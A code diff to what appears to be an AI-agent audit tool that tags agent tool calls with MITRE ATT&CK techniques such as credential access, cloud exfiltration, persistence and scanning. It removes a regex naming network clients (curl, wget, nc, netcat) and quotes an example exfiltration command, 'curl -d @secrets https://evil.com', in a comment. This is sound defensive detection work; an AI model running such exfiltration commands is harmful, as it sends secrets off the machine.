@@ -15,7 +15,6 @@ stay for display.
 from __future__ import annotations
 
 import json
-import re
 from typing import Any
 
 
@@ -108,6 +107,16 @@ _TOOL_MAP: dict[str, dict[str, str]] = {
 #  in the detection rules, not in per-event tagging.)
 _CREDENTIAL_ACCESS = _m("TA0006", "Credential Access", "T1552.001", "Credentials In Files")
 _PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")
+# Seen in the command itself (#55). Ordered below credentials and egress.
+_EXFIL_CLOUD = _m("TA0010", "Exfiltration", "T1567.002", "Exfiltration to Cloud Storage")
+_SCHEDULED = _m("TA0003", "Persistence", "T1053.005", "Scheduled Task")
+_CRON = _m("TA0003", "Persistence", "T1053.003", "Cron")
+_DECODE = _m("TA0005", "Defense Evasion", "T1140", "Deobfuscate/Decode Files or Information")
+_ARCHIVE = _m("TA0009", "Collection", "T1560.001", "Archive via Utility")
+_ARCHIVE_LIBRARY = _m("TA0009", "Collection", "T1560.002", "Archive via Library")
+_NETWORK_SCAN = _m("TA0007", "Discovery", "T1046", "Network Service Discovery")
+_VULN_SCAN = _m("TA0043", "Reconnaissance", "T1595.002", "Vulnerability Scanning")
+_WORDLIST_SCAN = _m("TA0043", "Reconnaissance", "T1595.003", "Wordlist Scanning")
 
 # Credential and private-key recognition now lives in detection/traits.py, and
 # this module imports it rather than keeping a second copy.
@@ -121,15 +130,41 @@ _PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")
 # information and no test corpus. A disagreement between them was not merely
 # possible, it was undetectable.
 from agentmetry.core.audit.detection.traits import (  # noqa: E402
+    ARCHIVE_COMMAND,
+    ARCHIVE_LIBRARY,
+    CREDENTIAL_SEARCH,
+    DESTROY_COMMAND,
+    NETWORK_CLIENT,
+    NETWORK_SCAN,
+    VULN_SCAN,
+    WORDLIST_SCAN,
+    interpreter_code_text,
+    reaches_remote_host,
+    mask_search_patterns,
+    unmask_search_patterns,
+    variable_text,
+    CLOUD_STORAGE_UPLOAD,
+    CRON_INSTALL,
+    DECODE_COMMAND,
+    SCHEDULED_TASK,
     CREDENTIAL_CLI,
     CREDENTIAL_ENV,
     CREDENTIAL_ENV_DUMP,
     CREDENTIAL_PATH,
     ENV_FILE,
+    ENV_FILE_SENT,
     INTERPRETER_NETWORK,
     PRIVATE_KEY_PATH,
+    LITERAL_SECRET,
     interpreter_network_text,
+    issuer_bound,
+    lists_key_folder,
+    mask_env_names_only,
+    mask_key_listings,
+    mask_prose_flags,
+    env_dump_view,
     mask_literals,
+    tool_kind,
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
@@ -140,24 +175,11 @@ from agentmetry.core.audit.detection.traits import (  # noqa: E402
 #
 # This tags a *fact* about one event (it talked to the network). Exfiltration
 # itself stays a sequence signal, decided by the detection rules.
-_NETWORK_CLIENT = re.compile(
-    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nc|netcat|scp|rsync|ftp|telnet)\b"
-)
-_URL_HOST = re.compile(r"https?://(?:[^\s/@'\"]*@)?([^\s/:'\"]+)")
-_BARE_IP = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
-# Loopback is not egress. Hitting your own health endpoint is the single most
-# common thing a developer does while running this tool, and tagging it
-# Command and Control buries the one event that matters under a hundred that
-# don't. Anything off the box still counts, including the LAN: exfil to the
-# machine next to you is still exfil.
-_LOOPBACK = re.compile(r"^(?:localhost|127(?:\.\d{1,3}){3}|0\.0\.0\.0|\[?::1\]?)$")
-_C2 = _m("TA0011", "Command and Control", "T1071.001", "Web Protocols")
-
-
-def _reaches_remote_host(text: str) -> bool:
-    """True when the command names a target that is not this machine."""
-    hosts = _URL_HOST.findall(text) + _BARE_IP.findall(text)
-    return any(not _LOOPBACK.match(host) for host in hosts)
+# The network vocabulary is shared with classify_command (traits.py), so the two
+# cannot drift: a mapper with its own client list missed `sftp` and `| ssh`,
+# and its own host list never saw scp-style `user@host:` remotes.
+_NETWORK_CLIENT = NETWORK_CLIENT
+_reaches_remote_host = reaches_remote_host
 
 
 #: Argument names that carry free text a human or a model wrote. A credential
@@ -181,10 +203,30 @@ def _path_evidence_text(evidence: Any, fallback: str) -> str:
     """
     if not isinstance(evidence, dict):
         return fallback
-    kept = {k: v for k, v in evidence.items() if str(k).lower() not in _PROSE_KEYS}
+    kept = {
+        k: v
+        for k, v in evidence.items()
+        if str(k).lower() not in _PROSE_KEYS and _names_a_location(str(k))
+    }
     if not kept:
         return ""
     return _evidence_text(kept)
+
+
+#: Argument names that hold a location a tool will open. Keeping only these
+#: replaced keeping everything but known prose: the prose list can never be
+#: complete, and a recap field (`mcp__ccd_turn__wrap_up {recap}`) or a plan's
+#: `items` that mentioned `.env` earned T1552.001 and completed a critical
+#: (#329, the #49 family). A key that names no location is not a file read.
+_LOCATION_WORDS = ("path", "file", "dir", "folder")
+_LOCATION_KEYS = frozenset(
+    {"target", "src", "source", "dest", "destination", "uri", "location", "cwd", "root"}
+)
+
+
+def _names_a_location(key: str) -> bool:
+    k = key.lower().replace("_", "").replace("-", "")
+    return k in _LOCATION_KEYS or any(w in k for w in _LOCATION_WORDS)
 
 
 def _shell_text(evidence: Any) -> str | None:
@@ -229,6 +271,15 @@ def get_mitre_mapping(
     """
     text = _evidence_text(evidence)
 
+    # The tool decides which upgrades its evidence can earn, exactly as in
+    # traits.classify_tool_call, so the two classifiers cannot disagree (#40).
+    # A write or a listing earns none: the evidence is a path or file content,
+    # and writing `.env` is not reading it (#329, shapes 4 and 5). A read earns
+    # the credential upgrades from its path, never C2.
+    kind = tool_kind(tool_qualified)
+    if kind in ("write", "list"):
+        text = ""
+
     # 1. Content upgrades win — a read that touches a key is credential access,
     #    not generic collection.
     if text:
@@ -252,16 +303,50 @@ def get_mitre_mapping(
             # treated as a read.
             literal = _path_evidence_text(evidence, text)
             written = text
-        if PRIVATE_KEY_PATH.search(literal):
+        # A command that only lists a key folder opens nothing: it is
+        # discovery, mapped below, exactly as classify_command decides it.
+        listed = literal
+        if kind == "command" and shell:
+            listed = mask_key_listings(
+                mask_prose_flags(
+                    mask_search_patterns(unmask_search_patterns(literal, shell), shell), shell
+                ),
+                shell,
+            )
+        if PRIVATE_KEY_PATH.search(listed):
             return _PRIVATE_KEY
-        if (
-            CREDENTIAL_PATH.search(literal)
-            or ENV_FILE.search(literal)
-            or CREDENTIAL_ENV.search(text)
-            or CREDENTIAL_ENV_DUMP.search(written)
+        if kind == "read":
+            if CREDENTIAL_PATH.search(literal) or ENV_FILE.search(literal):
+                return _CREDENTIAL_ACCESS
+            text = ""
+        elif (
+            CREDENTIAL_PATH.search(listed)
+            or ENV_FILE_SENT.search(mask_literals(shell) if shell else written)
+            or ENV_FILE.search(
+                # The raw shell text, not lowered: awk's `-F` and `-f` differ.
+                mask_env_names_only(listed, shell if shell else None)
+            )
+            or (
+                # A `$NAME` in structured arguments is not expanded by
+                # anything: only shell text dereferences a variable.
+                (
+                    (shell and CREDENTIAL_ENV.search(variable_text(text, literal, written)))
+                    or LITERAL_SECRET.search(shell or text)
+                )
+                and not (shell and issuer_bound(shell, mask_literals(shell)))
+            )
+            or CREDENTIAL_ENV_DUMP.search(env_dump_view(written, shell or None))
+            or (shell and CREDENTIAL_SEARCH.search(shell))
             or CREDENTIAL_CLI.search(written)
         ):
             return _CREDENTIAL_ACCESS
+        # Command words in their original case (tar's `-C` is not `-c`), with
+        # quotes and heredocs masked so a description of the command is not it.
+        words = mask_literals(shell) if shell else written
+        # Exfiltration to a bucket outranks C2: `azcopy` to a blob URL is both,
+        # and the specific technique is the useful one (#55).
+        if kind == "command" and CLOUD_STORAGE_UPLOAD.search(words):
+            return _EXFIL_CLOUD
         # A shell that reaches the network is C2, whatever the tool is called.
         # An interpreter counts: `python -c "urllib.request.urlopen(...)"` is a
         # network client, and in a container it is often the only one installed.
@@ -276,6 +361,31 @@ def get_mitre_mapping(
             )
         ):
             return _C2
+        # Observable techniques that used to collapse into T1059 (#55).
+        if kind == "command":
+            if SCHEDULED_TASK.search(words):
+                return _SCHEDULED
+            if CRON_INSTALL.search(words):
+                return _CRON
+            code = interpreter_code_text(shell, words) if shell else words
+            if DESTROY_COMMAND.search(words):
+                return _DESTRUCTION
+            if DECODE_COMMAND.search(code):
+                return _DECODE
+            if ARCHIVE_COMMAND.search(words):
+                return _ARCHIVE
+            if ARCHIVE_LIBRARY.search(code):
+                return _ARCHIVE_LIBRARY
+            # Scanners, after the network check above: `nmap ... | curl -d @-`
+            # sends its results somewhere, and the egress is the stronger label.
+            if NETWORK_SCAN.search(words):
+                return _NETWORK_SCAN
+            if VULN_SCAN.search(words):
+                return _VULN_SCAN
+            if WORDLIST_SCAN.search(words):
+                return _WORDLIST_SCAN
+            if shell and lists_key_folder(literal):
+                return _DISCOVERY
 
     # 2. Tool-name mapping on the method segment (the part after the last '.'),
     #    normalized so Cursor/Claude/driver spellings all land on one entry.
